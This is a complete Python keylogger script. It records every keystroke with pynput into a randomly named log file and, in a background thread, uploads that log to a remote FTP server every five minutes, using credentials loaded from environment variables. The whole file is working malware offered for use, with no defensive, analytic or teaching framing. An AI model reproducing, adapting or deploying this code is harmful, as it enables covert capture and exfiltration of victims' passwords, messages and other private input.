# importing the necessary libraries
import logging
import os
import threading
from ftplib import FTP
from time import sleep
from pynput.keyboard import Listener
import random
from dotenv import load_dotenv


load_dotenv()

random_number = random.randint(299, 9999999)
# setting up the logging configurations
logging.basicConfig(
    filename=f"{random_number}-keylog.txt",
    level=logging.DEBUG,
    format=" %(asctime)s - %(message)s"
)


# uploads the logged file to the ftp server
def upload_log():
    # FTP server credentials
    ftp_server = os.getenv("FTP_HOST")
    ftp_username = os.getenv("FTP_USER")
    ftp_password = os.getenv("FTP_PASS")

    # Connect to the FTP server
    ftp = FTP(ftp_server)
    ftp.login(user=ftp_username, passwd=ftp_password)

    # Change directory (if necessary)
    # ftp.cwd("/path/to/remote/directory")

    # Upload the file
    with open(f"{random_number}-keylog.txt", "rb") as file:
        ftp.storbinary(f"STOR {random_number}-keylog.txt", file)

    # Close the FTP connection
    ftp.quit()


# function to send the keys entered to the logger
def on_press(key):
    logging.info(str(key))


# event listener to listen for the keys pressed
def listen():
    with Listener(on_press=on_press) as listener:
        print("Listening to keystrokes.......")
        listener.join()


# uploads the logged file to the server in some
# time interval (in this situation it's 5 minutes)
def upload():
    while 1:
        print("uploading file.....")
        upload_log()
        sleep(60 * 5)


# threads to keep both the listener and the log upload running simultaneously
listeningThread = threading.Thread(target=listen)
uploadingThread = threading.Thread(target=upload)

# starting the threads (or processes)
listeningThread.start()
uploadingThread.start()
